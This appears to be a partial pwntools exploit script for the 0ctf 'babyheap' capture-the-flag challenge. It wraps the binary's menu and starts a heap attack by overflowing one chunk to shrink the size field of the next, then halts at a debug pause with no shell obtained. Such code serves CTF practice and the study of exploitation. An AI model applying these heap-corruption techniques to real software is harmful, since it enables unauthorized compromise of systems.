#!/usr/bin/env python

from pwn import *

def menu():
    r.recvuntil("Command: ")

def create(siz):
    menu()
    r.sendline("1")
    r.sendlineafter("Size: ",str(siz))
    
def dump(idx):
    menu()
    r.sendline("4")
    r.sendlineafter("Index: ",str(idx))
    data=r.recvlines(2)
    data=data[1]
    return data

def free(idx):
    menu()
    r.sendline("3")
    r.sendlineafter("Index: ",str(idx))

def edit(idx,message):
    r.sendlineafter("Command: ",str(2))
    r.sendlineafter("Index: ",str(idx))
    r.sendlineafter("Size: ",str(len(message)))
    r.sendlineafter("Content: ",message)

def exit():
    menu()
    r.sendline("5")
    
def main():
    global r
    r=process("./0ctfbabyheap")
    create(16) #0
    create(480) #1
    create(512) #2
    create(512) #3
    free(1)
    edit(0, flat('A'*24, '\x30')) # shrink the chunk
    raw_input("[DEBUG] {}".format(r.proc.pid))

if __name__ == '__main__':
    main()
